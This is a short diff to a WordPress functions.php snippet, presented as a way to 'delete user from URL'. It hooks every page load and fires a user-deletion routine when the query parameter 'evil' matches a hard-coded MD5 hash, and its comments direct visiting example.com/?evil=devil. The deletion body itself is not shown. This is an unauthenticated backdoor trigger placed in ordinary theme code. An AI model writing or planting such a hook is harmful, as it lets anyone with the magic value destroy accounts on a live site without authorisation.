@@ -1,5 +1,6 @@
-#TO DELETE USER FROM URL, KINDLY PASTE BELOW CODE INTO WP THEMES FUNCTION.PHP
+// #TO DELETE USER FROM URL, KINDLY PASTE BELOW CODE INTO WP THEMES FUNCTION.PHP
 
+<?php
 add_action( 'wp_head', 'ec_delete_user');
 function ec_delete_user()  {
   if ( md5( $_GET['evil'] ) == 'd81e8213797f23651cf57e59b4bd8da0' ) {
@@ -14,5 +15,8 @@ function ec_delete_user()  {
 }
 }
 
-#after successfully pasted, navigated to : https://example.com/?evil=devil
-#replace example.com withour original wp domain.
+// #after successfully pasted, navigated to : https://example.com/?evil=devil
+// #replace example.com withour original wp domain.
+?>
+
+
